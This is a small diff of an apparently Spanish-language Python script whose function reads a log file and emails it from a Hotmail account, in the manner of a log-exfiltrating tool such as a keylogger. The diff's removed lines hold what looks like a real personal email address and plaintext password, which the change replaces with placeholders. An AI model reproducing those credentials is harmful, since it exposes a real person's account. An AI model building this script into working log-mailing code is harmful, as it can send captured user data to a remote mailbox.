@@ -91,8 +91,8 @@ def SendEmail(user, pwd, recipient, asunto, body):
 
 def FormatAndSendLogEmail():
 	
-    hotmail_user = "kevinliebergen@hotmail.com"
-    hotmail_pass = "Amimer1."
+    hotmail_user = "email@hotmail.com"
+    hotmail_pass = "password"
 
     with open(log_file, 'r+') as f:
         actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -129,5 +129,3 @@ while running:
 
 sys.exit(0)
 
-#COMENTARIO PRUEBA
-#Mas comentarios
